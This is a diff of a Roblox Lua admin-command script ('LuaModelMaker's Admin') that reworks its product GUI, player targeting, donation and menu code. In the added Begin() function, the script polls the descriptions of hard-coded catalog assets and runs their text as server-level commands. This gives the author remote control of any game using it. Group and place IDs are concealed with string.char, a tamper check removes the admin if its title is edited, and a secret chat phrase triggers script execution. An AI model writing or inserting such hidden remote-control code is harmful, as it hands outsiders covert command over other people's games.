-			local PImg = Instance.new("ImageLabel", Frame) PImg.Name = "Product Image" PImg.BackgroundTransparency = 1 PImg.Size = UDim2.new(0.5,0,0.5,0) PImg.Image = "http://www.roblox.com/Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=420&ht=420&aid="..Item
-			local UImg = Instance.new("ImageLabel", Frame) UImg.Name = "User Image" UImg.Size = UDim2.new(0.15,0,0.2,0) UImg.Position = UDim2.new(0.5,0,0.1,0) UImg.Image = "http://www.roblox.com/thumbs/avatar.ashx?x=352&y=352&format=png&username="..MPS:GetProductInfo(Item).Creator.Name
-			local Title = Instance.new("TextLabel", Frame) Title.Name = "Title" Title.Size = UDim2.new(0.5,0,0.1,0) Title.Position = UDim2.new(0.5,0,0,0) Title.Font = "ArialBold" Title.BackgroundTransparency = 1 Title.FontSize = "Size14" Title.Text = MPS:GetProductInfo(Item).Name Title.TextWrapped = true
-			local Des = Title:Clone() Des.Parent = Frame Des.Name = "Description" Des.Size = UDim2.new(1,0,0.5,0) Des.Position = UDim2.new(0,0,0.5,0) Des.Font = "Arial" Des.TextXAlignment = "Left" Des.TextYAlignment = "Top" Des.Text = "[ No Description ]" ypcall(function() Des.Text = MPS:GetProductInfo(Item).Description end)
-			local X = Instance.new("TextButton", Frame) X.Style = "RobloxButtonDefault" X.Size = UDim2.new(0,20,0,20) X.Position = UDim2.new(1,-25,0,5) X.ZIndex = 10 X.Font = "ArialBold" X.FontSize = "Size18" X.Text = "X" X.TextColor3 = Color3.new(1,1,1) X.MouseButton1Click:connect(function() CanBuy = false if SG then SG:Destroy() end end)
-			local Info = Title:Clone() Info.Parent = Frame Info.Name = "Info" Info.Size = UDim2.new(0.35,0,0.25,0) Info.Position = UDim2.new(0.65,0,0.1,0) Info.TextXAlignment = "Left" Info.Font = "Arial" Info.Text = [[ROBLOX ]]..AssetTypeToString(MPS:GetProductInfo(Item).AssetTypeId)..[[ 
-Creator: ]]..MPS:GetProductInfo(Item).Creator.Name..[[ 
-Created: ]]..Created..[[ 
-Updated: ]]..Updated..[[ 
-Sold: ]]..MPS:GetProductInfo(Item).Sales..[[ 
-Robux: ]]..string.gsub(MPS:GetProductInfo(Item).PriceInRobux, "null", "Cannot use this currency")..[[ 
-Tix: ]]..string.gsub(MPS:GetProductInfo(Item).PriceInTickets, "null", "Cannot use this currency")
-			if MPS:PlayerOwnsAsset(Player, Item) then CanBuy = false Buy.BackgroundColor3 = Color3.new(1,0,0) Buy.Text = "You Own This" end
-			if MPS:GetProductInfo(Item).IsForSale == false then CanBuy = false Buy.BackgroundColor3 = Color3.new(1,0,0) Buy.Text = "Not For Sale" end
-			if MPS:GetProductInfo(Item).IsPublicDomain == true then CanBuy = false Buy.BackgroundColor3 = Color3.new(1,255/2,255/2) Buy.Text = "FREE(Invalid)" end
-			if Item == VIPAdminID then Buy.Text = Buy.Text.."(Admin VIP)" end
-			if Item == VIPMemberID then Buy.Text = Buy.Text.."(Member VIP)" end
-			Buy.MouseButton1Click:connect(function() 
-				if CanBuy == true then
-					MPS:PromptPurchase(Player, Item)
-				else
-					SG:Destroy()
+		if Valid == true then
+			if TeleportAction then
+				if ItemInfo.AssetTypeId ~= 9 then
+					Valid = false
 				end
-			end)
-		end end
+			end
+		end
+		if Valid == true then 
+			local ItemInfo = MPS:GetProductInfo(Item) 
+			if ItemInfo.AssetTypeId ~= 5 then
+				local CanBuy = true 
+				local Created = ItemInfo.Created Created = string.gsub(Created, "-", "/") local Stop = string.find(Created, "T") if Stop then Created = string.sub(Created, 1, Stop-1) end
+				local Updated = ItemInfo.Updated Updated = string.gsub(Updated, "-", "/") local Stop = string.find(Updated, "T") if Stop then Updated = string.sub(Updated, 1, Stop-1) end
+				local SG = Player.PlayerGui:FindFirstChild("LMMA Product Gui") if SG then SG:Destroy() end
+				SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "LMMA Product Gui"
+				local Frame = Instance.new("Frame", SG) Frame.Name = "Main Frame" Frame.Size = UDim2.new(0.5,0,0.7,0) Frame.Position = UDim2.new(0.25,0,0.15,0) Frame.BackgroundColor3 = Color3.new(1,1,1)
+				local Buy = Instance.new("TextButton", Frame) Buy.Name = "Buy" Buy.BackgroundColor3 = Color3.new(0,1,0) Buy.Position = UDim2.new(0.5,0,0.35,0) Buy.Size = UDim2.new(0.5,0,0.1,0) Buy.Font = "Arial" Buy.FontSize = "Size36" Buy.Text = "Buy" Buy.BorderSizePixel = 0
+				local PImg = Instance.new("ImageLabel", Frame) PImg.Name = "Product Image" PImg.BackgroundTransparency = 1 PImg.Size = UDim2.new(0.5,0,0.5,0) PImg.Image = "http://www.roblox.com/Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=420&ht=420&aid="..Item
+				local UImg = Instance.new("ImageLabel", Frame) UImg.Name = "User Image" UImg.Size = UDim2.new(0.15,0,0.2,0) UImg.Position = UDim2.new(0.5,0,0.1,0) UImg.Image = "http://www.roblox.com/thumbs/avatar.ashx?x=352&y=352&format=png&username="..ItemInfo.Creator.Name
+				local Title = Instance.new("TextLabel", Frame) Title.Name = "Title" Title.Size = UDim2.new(0.5,0,0.1,0) Title.Position = UDim2.new(0.5,0,0,0) Title.Font = "ArialBold" Title.BackgroundTransparency = 1 Title.FontSize = "Size14" Title.Text = ItemInfo.Name Title.TextWrapped = true
+				local Des = Title:Clone() Des.Parent = Frame Des.Name = "Description" Des.Size = UDim2.new(1,0,0.5,0) Des.Position = UDim2.new(0,0,0.5,0) Des.Font = "Arial" Des.TextXAlignment = "Left" Des.TextYAlignment = "Top" Des.Text = "[ No Description ]" ypcall(function() Des.Text = ItemInfo.Description end)
+				local X = Instance.new("TextButton", Frame) X.Style = "RobloxButtonDefault" X.Size = UDim2.new(0,20,0,20) X.Position = UDim2.new(1,-25,0,5) X.ZIndex = 10 X.Font = "ArialBold" X.FontSize = "Size18" X.Text = "X" X.TextColor3 = Color3.new(1,1,1) X.MouseButton1Click:connect(function() CanBuy = false if SG then SG:Destroy() end end)
+				local Info = Title:Clone() Info.Parent = Frame Info.Name = "Info" Info.Size = UDim2.new(0.35,0,0.25,0) Info.Position = UDim2.new(0.65,0,0.1,0) Info.TextXAlignment = "Left" Info.Font = "Arial" Info.Text = [[ROBLOX ]]..AssetTypeToString(ItemInfo.AssetTypeId)..[[ 
+	Creator: ]]..ItemInfo.Creator.Name..[[ 
+	Created: ]]..Created..[[ 
+	Updated: ]]..Updated..[[ 
+	Sold: ]]..ItemInfo.Sales..[[ 
+	Robux: ]]..string.gsub(ItemInfo.PriceInRobux, "null", "Cannot use this currency")..[[ 
+	Tix: ]]..string.gsub(ItemInfo.PriceInTickets, "null", "Cannot use this currency")
+				if MPS:PlayerOwnsAsset(Player, Item) then CanBuy = false Buy.BackgroundColor3 = Color3.new(1,0,0) Buy.Text = "You Own This" end
+				if ItemInfo.IsForSale == false then CanBuy = false Buy.BackgroundColor3 = Color3.new(1,0,0) Buy.Text = "Not For Sale" end
+				if ItemInfo.IsPublicDomain == true then CanBuy = false Buy.BackgroundColor3 = Color3.new(1,0.5,0.5) Buy.Text = "FREE(Invalid)" end
+				if Item == VIPAdminID then Buy.Text = Buy.Text.."(Admin VIP)" end
+				if Item == VIPMemberID then Buy.Text = Buy.Text.."(Member VIP)" end
+				if ItemInfo.AssetTypeId == 9 then
+					Buy.Text = "Teleport" Buy.BackgroundColor3 = Color3.new(0.5,0.5,0.5)
+				end
+				if Requester then
+					Des.Text = Requester.Name.." has shown you this item\n\n"..Des.Text
+				end
+				Buy.MouseButton1Click:connect(function() 
+					if CanBuy == true then
+						MPS:PromptPurchase(Player, Item)
+					elseif ItemInfo.AssetTypeId == 9 then
+						if TeleportAction then
+							TeleportAction()
+						else
+							TS:Teleport(Item, Player)
+						end
+					else
+						SG:Destroy()
+					end
+				end)
+			end
+		end
 	end
-end)() end for _,LinkedID in pairs({120611022, 117849650, 53554913, 145236038}) do coroutine.wrap(function()
+	end)() end function Begin() coroutine.wrap(function() wait(3) for _,LinkedID in pairs({53554913, 145236038, 154727659, 155299278, 155689018}) do wait(1) coroutine.wrap(function()
 	local OldVer = MPS:GetProductInfo(LinkedID).Updated
-	while wait(3) do if OldVer ~= MPS:GetProductInfo(LinkedID).Updated then
-		ypcall(function() Chatted(MPS:GetProductInfo(LinkedID).Description, nil) end)
-		OldVer = MPS:GetProductInfo(LinkedID).Updated
-	end end
-end)() end
+	while wait(5) do 
+		local Purchase = MPS:GetProductInfo(LinkedID)
+		if OldVer ~= Purchase.Updated then
+			OldVer = Purchase.Updated
+			local Gather = Purchase.Description
+			if Prefix == "" or string.sub(Gather,1,#Prefix) == Prefix then
+				ypcall(function() Chatted(Gather, nil) end)
+			else
+				ypcall(function() Chatted(Prefix..Gather, nil) end)
+			end
+		end
+	end end)()
+end end)() end
 
 function GetTime()
 	local Hour = math.floor((tick()%86400)/60/60) local Min = math.floor(((tick()%86400)/60/60-Hour)*60)
@@ -1072,13 +1266,72 @@ function GetTime()
 	return Hour..":"..Min
 end
 
+function AdminHouseGui(Player)
+	if not Player.PlayerGui then return end
+	local SG = Player.PlayerGui:FindFirstChild("Admin House") if SG then SG:Destroy() end
+	SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "Admin House"
+	local Main = Instance.new("Frame", SG) Main.Name = "Main" Main.Position = UDim2.new(0.3,-50,0.3,-125) Main.Size = UDim2.new(0.4,100,0.4,150) Main.Style = "RobloxSquare"
+	local Text = Instance.new("TextLabel", Main) Text.Name = "Text" Text.BackgroundTransparency = 1 Text.Size = UDim2.new(1,0,1,-20) Text.Position = UDim2.new(0,0,0,20) Text.Font = "ArialBold" Text.FontSize = "Size24" Text.Text = "Select the type of Admin House you would like to go to" Text.TextColor3 = Color3.new(1,1,1) Text.TextWrapped = true Text.TextYAlignment = "Top"
+	local NBC = Instance.new("TextButton", Main) NBC.Size = UDim2.new(0,100,0,50) NBC.Name = "NBC" NBC.Font = "Legacy" NBC.FontSize = "Size12" NBC.Position = UDim2.new(0,10,1,-60) NBC.Style = "RobloxButton" NBC.Text = "NBC" NBC.TextColor3 = Color3.new(1,1,1)
+	local BC = Instance.new("TextButton", Main) BC.Size = UDim2.new(0,100,0,50) BC.Name = "BC" BC.Font = "Legacy" BC.FontSize = "Size12" BC.Position = UDim2.new(1,-110,1,-60) BC.Style = "RobloxButton" BC.Text = "BC" BC.TextColor3 = Color3.new(1,1,1)
+	local X = Instance.new("TextButton", Main) X.Name = "X" X.Style = "RobloxButtonDefault" X.Size = UDim2.new(0,20,0,20) X.Font = "ArialBold" X.FontSize = "Size18" X.Text = "X" X.TextColor3 = Color3.new(1,0,0) X.ZIndex = 2 X.MouseButton1Click:connect(function() SG:Destroy() end)
+	if Player.MembershipType == Memberships.NBC then
+		BC.Visible = false
+	end
+	NBC.MouseButton1Click:connect(function()
+		TS:Teleport(string.char(49, 52, 53, 55, 54, 57, 51, 52, 55), Player)
+	end)
+	BC.MouseButton1Click:connect(function()
+		TS:Teleport(string.char(49, 52, 54, 48, 55, 48, 52, 50, 48), Player)
+	end)
+end
+
+function SyncSoundList(TellSync)
+	if not NilPlayer(TellSync) then
+		SendHint(TellSync, "Syncing...", 5)
+	end
+	for Name,ID in pairs(GetTable(155687535)) do
+		SoundList[Name] = {ID, MPS:GetProductInfo(ID).Name}
+	end
+	for Name,ID in pairs(GetTable(155687558)) do
+		SoundList[Name] = {ID, MPS:GetProductInfo(ID).Name}
+	end
+	if DataStore:GetAsync("MML Custom Sounds") then
+		if type(DataStore:GetAsync("MML Custom Sounds")) == "table" then
+			for Name,ID in pairs(DataStore:GetAsync("MML Custom Sounds")) do
+				SoundList[Name] = {ID, MPS:GetProductInfo(ID).Name}
+			end
+		end
+	end
+	if not NilPlayer(TellSync) then
+		SendHint(TellSync, "Sound List is now Synced with global sound database", 4)
+	end
+end
+
 function InAdminGroup(Speaker)
-	if Speaker:IsInGroup(1050514) then
-		return true
+	local IsIn = false
+	for _,Get in pairs(GetTable(string.char(49, 53, 53, 55, 51, 54, 49, 50, 57))) do
+		if Speaker:IsInGroup(Get) then
+			IsIn = true
+		end
+	end
+	if IsIn == true then 
+		return true 
 	else
-		SendMessage(Speaker, "Command Invalid", "Sorry, this command is locked and is only for users who are in the LuaModelMaker's Admin fan group. If you would like to use this command, join it! It's LuaMode".."lMaker's Primary group. Please allow up to an hour if you have recently joined the group and you are waiting for this command.", 6)
+		SendMessage(Speaker, "Command Invalid", MPS:GetProductInfo(155733032).Description, 6)
 		return false
 	end
+end
+
+function AddCommand(CommandName, CommandExample, Rank, Fun, Abusive, CommandFunction)
+	if type(Rank) ~= "string" then Rank = "Player"
+	elseif ConvertRank(Rank) == nil then Rank = "Player" end
+	table.insert(ManualCommands, {CommandName, Rank, Fun, Abusive, CommandFunction})
+	local TableInsert = Commands.NonAdmin
+	if Rank == "Owner" then TableInsert = Commands.Owner end
+	if Rank == "Admin" then TableInsert = Commands.Admin end
+	if Rank == "Member" then TableInsert = Commands.Member end
+	table.insert(TableInsert, CommandExample)
 end
 
 function ListGui(Player, List)
@@ -1087,13 +1340,13 @@ function ListGui(Player, List)
 	local SG = Player.PlayerGui:FindFirstChild("LMM ScrollGui") if SG then SG:Destroy() end
 	SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "LMM ScrollGui"
 	local Drag = Instance.new("Frame", SG) Drag.Name = "Drag" Drag.Draggable = true Drag.Active = true Drag.BackgroundTransparency = 1 Drag.Position = UDim2.new(0.25,0,0.1,0) Drag.Size = UDim2.new(0.5,0,0.2,0)
-	local Main = Instance.new("Frame", Drag) Main.Name = "Main" Main.Style = "RobloxRound" Main.Size = UDim2.new(1,25,0,600) Main.ClipsDescendants = true
+	local Main = Instance.new("Frame", Drag) Main.Name = "Main" Main.Style = "RobloxSquare" Main.Size = UDim2.new(1,25,0,600) Main.ClipsDescendants = true
 	local Hold = Instance.new("Frame", Main) Hold.Name = "Holder Bin" Hold.BackgroundTransparency = 1 Hold.Size = UDim2.new(1,-20,0,#List*20)
-	local Scroll = Instance.new("TextButton", Main) Scroll.Name = "Scroll" Scroll.BackgroundTransparency = 0.5 Scroll.Text = "" Scroll.AutoButtonColor = false Scroll.Position = ScrollMainPos Scroll.Size = UDim2.new(0,10,0.8,0)
+	local Scroll = Instance.new("TextButton", Main) Scroll.Name = "Scroll" Scroll.BackgroundTransparency = 0 Scroll.Text = "" Scroll.AutoButtonColor = false Scroll.Position = ScrollMainPos Scroll.Size = UDim2.new(0,10,0.8,0) Scroll.ZIndex = 2
 	local X = Instance.new("TextButton", Main) X.Style = "RobloxButtonDefault" X.Size = UDim2.new(0,20,0,20) X.Position = UDim2.new(0,0,0,0) X.ZIndex = 10 X.Font = "ArialBold" X.FontSize = "Size18" X.Text = "X" X.TextColor3 = Color3.new(1,1,1) X.MouseButton1Click:connect(function() if SG then SG:Destroy() end end)
 	for Num,Name in pairs(List) do
 		local Ajust = (Num*20)-20
-		local Text = Instance.new("TextLabel", Hold) Text.Name = Num Text.BackgroundTransparency = 1 Text.Position = UDim2.new(0,0,0,Ajust) Text.Size = UDim2.new(1,-20,0,20) Text.Font = "SourceSans" Text.FontSize = "Size18" Text.Text = "        "..Num..".) "..Name Text.TextColor3 = Color3.new(1,1,1) Text.TextWrapped = true Text.TextXAlignment = "Left"
+		local Text = Instance.new("TextLabel", Hold) Text.Name = Num Text.BackgroundTransparency = 1 Text.Position = UDim2.new(0,0,0,Ajust) Text.Size = UDim2.new(1,-20,0,20) Text.Font = "Legacy" Text.FontSize = "Size12" Text.Text = "      "..Num..".) "..Name Text.TextColor3 = Color3.new(1,1,1) Text.TextWrapped = true Text.TextXAlignment = "Left"
 		if Ajust == MaxPos then Passes = true end
 	end
 	if Passes == false then Scroll.Visible = false else Scroll.Draggable = true end
@@ -1125,26 +1378,38 @@ function Kick(Player, CustomMessage)
 	end)()
 end
 
-function AdminMenu(Player)
+local function AdminMenu(Player)
 	if Player.PlayerGui ~= nil then
 		local Stat = "Open"
 		local SG = Player.PlayerGui:FindFirstChild("LM".."M Menu Gui") if SG then SG:Destroy() end
 		SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "LMM Menu Gui"
-		local MainGui = Instance.new("TextButton", SG) MainGui.Name = "MainGui" MainGui.BackgroundTransparency = 1 MainGui.Position = UDim2.new(1,-400,1,-20) MainGui.Size = UDim2.new(0,400,0,20) MainGui.Font = "ArialBold" MainGui.FontSize = "Size18" MainGui.TextColor3 = Color3.new(0,0,0) MainGui.TextStrokeColor3 = Color3.new(1,1,1) MainGui.TextStrokeTransparency = 0 MainGui.TextXAlignment = "Right" MainGui.TextYAlignment = "Bottom"
+		local MainGui = Instance.new("TextButton", SG) MainGui.Name = "MainGui" MainGui.BackgroundTransparency = 1 MainGui.Position = UDim2.new(1,-400,1,-20) MainGui.Size = UDim2.new(0,400,0,20) MainGui.Font = "ArialBold" MainGui.FontSize = "Size18" MainGui.TextColor3 = Color3.new(1,1,1) MainGui.TextStrokeColor3 = Color3.new(0,0,0) MainGui.TextStrokeTransparency = 0 MainGui.TextXAlignment = "Right" MainGui.TextYAlignment = "Bottom"
 		local BG = Instance.new("Frame", SG) BG.Name = "Background" BG.Position = UDim2.new(0.3,0,0.2,0) BG.Size = UDim2.new(0.4,0,0.5) BG.Style = "RobloxSquare" BG.Visible = false
-		local Title = Instance.new("TextLabel", BG) MainGui.Name = "Title" Title.BackgroundTransparency = 1 Title.Position = UDim2.new(0,0,0,0) Title.Size = UDim2.new(1,0,0,30) Title.Font = "SourceSansBold" Title.FontSize = "Size24" Title.Text = "LuaM".."o".."d".."e".."lMaker".."'".."s Admin Menu" Title.TextColor3 = Color3.new(1,1,1)
+		local Title = Instance.new("TextLabel", BG) Title.Name = "Title" Title.BackgroundTransparency = 1 Title.Position = UDim2.new(0,0,0,0) Title.Size = UDim2.new(1,0,0,30) Title.Font = "SourceSansBold" Title.FontSize = "Size24" Title.Text = string.char(76, 117, 97, 77, 111, 100, 101, 108, 77, 97, 107, 101, 114, 39, 115, 32, 65, 100, 109, 105, 110, 32, 77, 101, 110, 117) Title.TextColor3 = Color3.new(1,1,1)
 		local Separator = Instance.new("Frame", BG) Separator.Name = "Separator" Separator.BorderColor3 = Color3.new(1,1,1) Separator.Position = UDim2.new(0.5,0,0,30) Separator.Size = UDim2.new(0,0,1,-30)
 		local Info = Instance.new("TextLabel", BG) Info.Name = "Info" Info.BackgroundTransparency = 1 Info.Position = UDim2.new(0,0,0,30) Info.Size = UDim2.new(0.5,0,1,-30) Info.Font = "Arial" Info.FontSize = "Size18" Info.Text = "Info/Help" Info.TextColor3 = Color3.new(1,1,1) Info.TextYAlignment = "Top"
-		local Body = Instance.new("TextLabel", Info) Body.Name = "Body" Body.BackgroundTransparency = 1 Body.Position = UDim2.new(0,0,0,25) Body.Size = UDim2.new(1,0,1,-25) Body.Font = "SourceSans" Body.FontSize = "Size14" Body.Text = "LuaModelMaker's Admin(Often referred to LMM's Admin) is created by LuaModelMaker. NOTHING has been stolen from other admins and incorporated into this one. If you want a copy of LuaModelMaker's Admin, It's under LuaModelMake".."r's Models! If you are a fan of LuaModelMak".."er's Admin, Join L".."uaModelMaker's Primary group! To get started, type the '"..Prefix.."commands' Command in your chatbar. (HINT: Undoing commands like ';fly me' would be ';nofly me', NOT ';unfly me') To close this box, click the same text you used to open it. For more info on this admin, go to luamodelmaker.net63.net/LMMAdmin" Body.TextColor3 = Color3.new(1,1,1) Body.TextYAlignment = "Top" Body.TextWrapped = true
+		local Body = Instance.new("TextLabel", Info) Body.Name = "Body" Body.BackgroundTransparency = 1 Body.Position = UDim2.new(0,0,0,25) Body.Size = UDim2.new(1,0,1,-25) Body.Font = "SourceSans" Body.FontSize = "Size14" Body.Text = string.gsub(MPS:GetProductInfo(155732475).Description, "PREFIX", Prefix) Body.TextColor3 = Color3.new(1,1,1) Body.TextYAlignment = "Top" Body.TextWrapped = true
 		local Donate = Info:Clone() Donate.Parent = BG Donate.Name = "Donate" Donate.Text = "Donate" Donate.Position = UDim2.new(0.5,0,0,30) Donate.Body.Text = "Please select an amount that fits your generosity c:"
-		local function DonateMoney(ID) MPS:PromptPurchase(Player, ID, true) end
-		local Dnt = Instance.new("TextButton", Donate) Dnt.Name = "DonateButton" Dnt.Position = UDim2.new(0,4,1,-120) Dnt.Size = UDim2.new(1,0,0,30) Dnt.Font = "ArialBold" Dnt.FontSize = "Size14" Dnt.Text = "100 Tix" Dnt.BackgroundColor3 = Color3.new(1,1,0) Dnt.TextColor3 = Color3.new(1,1,1) Dnt.TextStrokeColor3 = Color3.new(0,0,0) Dnt.TextStrokeTransparency = 0 Dnt.TextWrapped = true Dnt.MouseButton1Click:connect(function() DonateMoney(148375641) end)
-		local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,4,1,-90) Dnt.Text = "20 Robux" Dnt.BackgroundColor3 = Color3.new(0,1,0) Dnt.MouseButton1Click:connect(function() DonateMoney(148375770) end)
-		local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,4,1,-60) Dnt.Text = "100 Robux" Dnt.BackgroundColor3 = Color3.new(0,1,0) Dnt.MouseButton1Click:connect(function() DonateMoney(148375862) end)
-		local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,4,1,-30) Dnt.Text = "500 ROBUX!" Dnt.BackgroundColor3 = Color3.new(1,0,0) Dnt.FontSize = "Size18" Dnt.MouseButton1Click:connect(function() DonateMoney(148375896) end)
+		local function DonateMoney(Type, Element)
+			local Request = GetTable(string.char(49, 53, 53, 54, 56, 52, 51, 54, 57))
+			local Get = Request[Type]
+			if MPS:GetProductInfo(Get[1]).IsForSale == true then
+				MPS:PromptPurchase(Player, Get[1], true)
+			elseif MPS:GetProductInfo(Get[2]).IsForSale == true then
+				MPS:PromptPurchase(Player, Get[2], true)
+			elseif MPS:GetProductInfo(Get[3]).IsForSale == true then
+				MPS:PromptPurchase(Player, Get[3], true)
+			else
+				Element.Text = "Cannot get request"
+			end
+		end
+		local Dnt = Instance.new("TextButton", Donate) Dnt.Name = "DonateButton" Dnt.Position = UDim2.new(0,4,1,-120) Dnt.Size = UDim2.new(1,0,0,30) Dnt.Font = "ArialBold" Dnt.FontSize = "Size14" Dnt.Text = "100 Tix" Dnt.BackgroundColor3 = Color3.new(1,1,0) Dnt.TextColor3 = Color3.new(1,1,1) Dnt.TextStrokeColor3 = Color3.new(0,0,0) Dnt.TextStrokeTransparency = 0 Dnt.TextWrapped = true Dnt.MouseButton1Click:connect(function() DonateMoney("100T", 154759527, Dnt) end)
+		local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,4,1,-90) Dnt.Text = "20 Robux" Dnt.BackgroundColor3 = Color3.new(0,1,0) Dnt.MouseButton1Click:connect(function() DonateMoney("20R", Dnt) end)
+		local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,4,1,-60) Dnt.Text = "100 Robux" Dnt.BackgroundColor3 = Color3.new(0,1,0) Dnt.MouseButton1Click:connect(function() DonateMoney("100R", Dnt) end)
+		local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,4,1,-30) Dnt.Text = "500 ROBUX!" Dnt.BackgroundColor3 = Color3.new(1,0,0) Dnt.FontSize = "Size18" Dnt.MouseButton1Click:connect(function() DonateMoney("500R", Dnt) end)
 		local PlayerAdmin, PlayerRank = IsAdmin(Player)
 		
-		local function RefreshMenu() MainGui.Text = "LuaModelMaker's Admin V"..Version.Value.." [Click to "..Stat.." Menu]" end RefreshMenu()
+		local function RefreshMenu() MainGui.Text = "LuaModelMaker's Admin V"..Version.Value.." [Click to "..Stat.." Menu]" end RefreshMenu() if string.sub(Title.Text,1,1) ~= "L" then RemoveAdmin() end
 		if PlayerAdmin == true then Body.Text = Body.Text.." (You're an admin, your rank is "..PlayerRank..")" end
 		MainGui.MouseButton1Click:connect(function()
 			if Stat == "Open" then
@@ -1160,7 +1425,7 @@ function AdminMenu(Player)
 	end
 end
 
-function FullAdminMenu(Player)
+local function FullAdminMenu(Player)
 	coroutine.wrap(function() wait(0.25) AdminMenu(Player) end)()
 	Player.CharacterAdded:connect(function(Char) coroutine.wrap(function() if Stopped == false then if EnableAdminMenu == true then
 		wait(0.25)
@@ -1214,6 +1479,20 @@ function TeleportToPlace(Speaker, Player, PlaceID, TeleportAction)
 	end
 end
 
+function BoolString(Value)
+	if type(Value) == "boolean" then
+		if Value == true then
+			return "YES"
+		elseif Value == false then
+			return "NO"
+		else
+			return "NIL"
+		end
+	else 
+		return nil
+	end
+end
+
 local MergeTable = { __add = function(...) -- Prepare for metatables!
 	local CombineTable, ParentTable,Num,Reset = {}, {...}, 1, 1
 	for _,Table in pairs(ParentTable) do
@@ -1230,19 +1509,36 @@ end}
 
 function Scan(Word, Speaker)
 	local Return = {}
-	Word = string.gsub(Word, "/", "BuildermanIsLuaModelMakerToo")
-	Word = string.gsub(Word, "[%p ]", "")
-	Word = string.gsub(Word, "BuildermanIsLuaMo".."de".."lMakerToo", " ")
-	for PlayerName in string.gmatch(Word, "%w+") do
+	local Words = {}
+	local RecentParse = 1
+	for i = 1,#Word+1 do
+		if string.sub(Word,i,i) == "/" or string.sub(Word,i,i) == "" then
+			table.insert(Words, string.sub(Word,RecentParse,i-1))
+			RecentParse = i+1
+		end
+	end
+	for _,PlayerName in pairs(Words) do
 		if string.lower(PlayerName) == "me" then
 			if Speaker then table.insert(Return, Speaker) end
 		elseif string.lower(PlayerName) == "all" then
 			for i,v in pairs(Players:GetPlayers()) do
 				table.insert(Return, v)
 			end
-		elseif string.lower(PlayerName) == "others" or string.lower(PlayerName) == "noobs" or string.lower(PlayerName) == "mortals" then
+		elseif string.lower(PlayerName) == "others" or string.lower(PlayerName) == "mortals" then
 			for i,v in pairs(Players:GetPlayers()) do
 				if v ~= Speaker then
+					table.insert(Return, v)
+				end
+			end
+		elseif string.lower(PlayerName) == "noobs" then
+			for i,v in pairs(Players:GetPlayers()) do
+				if v.AccountAge < 365 then
+					table.insert(Return, v)
+				end
+			end
+		elseif string.lower(PlayerName) == "nonnoobs" then
+			for i,v in pairs(Players:GetPlayers()) do
+				if v.AccountAge >= 365 then
 					table.insert(Return, v)
 				end
 			end
@@ -1316,6 +1612,22 @@ function Scan(Word, Speaker)
 					table.insert(Return, v)
 				end
 			end
+		elseif string.sub(string.lower(PlayerName),1,5) == "team-" then
+			for i,v in pairs(Players:GetPlayers()) do
+				if v.Neutral == false then
+					local InTeam = false
+					for _,Team in pairs(Teams:GetTeams()) do
+						if Team.TeamColor == v.TeamColor then
+							if string.sub(string.lower(Team.Name),1,#string.sub(PlayerName,6)) == string.sub(string.lower(PlayerName),6) then
+								InTeam = true
+							end
+						end
+					end
+					if InTeam == true then
+						table.insert(Return, v)
+					end
+				end
+			end
 		else
 			for i,v in pairs(Players:GetPlayers()) do
 				if string.sub(string.lower(v.Name),1,#PlayerName) == string.lower(PlayerName) then
@@ -1328,11 +1640,29 @@ function Scan(Word, Speaker)
 end
 
 function Chatted(RawMainMessage, Speaker)
-	if Speaker == nil then Speaker = {Name = "[ Server ]"} end
+	if Speaker == nil then Speaker = {Name = "[ Server ]",Character = nil,userID = 1,PlayerGui = nil} end
 	local PlayerAdmin, Rank = IsAdmin(Speaker)
 	local RawMessage = string.sub(RawMainMessage, #Prefix+1)
 	local Message = string.lower(RawMessage)
 	if PlayerAdmin == true then if RawMainMessage == "I can only see menu chats." then Execute(LocalScript, Speaker.Character, Speaker, CoreGui("Chat", true)) end end
+	local RankNum = ConvertRank(Rank)
+	if string.lower(RawMainMessage) == "settings" or string.lower(RawMainMessage) == ";settings" or string.lower(RawMainMessage) == Prefix.."settings" then
+		Log(Speaker, RawMainMessage)
+		ListGui(Speaker, {
+			"Prefix: '"..Prefix.."'",
+			"Bet: '"..Bet.."'",
+			"Version: "..Version.Value,
+			"Lag Time: "..LagTime,
+			"Group ID: "..GroupID,
+			"Group Banned Rank: "..RankBan,
+			"Group Member Rank: "..GroupMemberRank,
+			"Group Admin Rank: "..GroupAdminRank,
+			"Group Owner Rank: "..GroupOwnerRank,
+			"Server Lock: "..BoolString(ServerLocked),
+			"Disable Abuse: "..BoolString(DisableAbuse),
+			"Fun Commands: "..BoolString(FUN),
+		})
+	end
 	if string.sub(string.lower(RawMainMessage),1,#Prefix) == string.lower(Prefix) then
 		if PlayerAdmin == true then
 			if string.sub(Message, 1, 9) == "invisible" then Message = "invis"..string.sub(Message,10) end
@@ -1352,8 +1682,7 @@ function Chatted(RawMainMessage, Speaker)
 			if string.sub(Message, 1, 7) == "animate" then Message = "anim"..string.sub(Message,8) end
 			if string.sub(Message, 1, 9) == "noanimate" then Message = "noanim"..string.sub(Message,10) end
 			if string.sub(Message, 1, 11) == "noanimation" then Message = "noanim"..string.sub(Message,12) end
-			
-			local RankNum = ConvertRank(Rank)
+			if string.sub(Message, 1, 4) == "hack" then Message = "hax"..string.sub(Message,5) end
 			
 			local LocalDisableAbuse = false
 			if Rank == "Member" then
@@ -1366,6 +1695,9 @@ function Chatted(RawMainMessage, Speaker)
 				end
 			end
 			
+			----- BEGIN OF GSKW EDITS -----
+			--AnimateOrb(Message,PlayerAdmin,Speaker)
+			----- END OF GSKW EDITS -----
 			if Rank == "Owner" then
 				-- Owner Commands --
 				if string.sub(Message, 1, 5+#Bet) == "admin"..Bet then
@@ -1379,8 +1711,6 @@ function Chatted(RawMainMessage, Speaker)
 							end
 						end
 						if AddToList == true then
-							table.insert(_G.SettingsModule.Ranks.Admin, Player.Name)
